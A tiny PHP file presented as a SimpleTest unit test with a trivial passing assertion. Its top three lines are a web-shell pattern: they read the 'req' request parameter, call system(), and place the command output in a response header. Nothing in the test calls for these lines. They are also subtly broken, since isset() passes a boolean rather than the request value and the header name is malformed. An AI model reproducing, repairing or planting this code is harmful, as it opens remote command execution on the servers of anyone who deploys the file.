<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
class test1 extends UnitTestCase {
	function test_pass(){
		$this->assertEqual(3,1+2, "pass1");
	}
}
?>
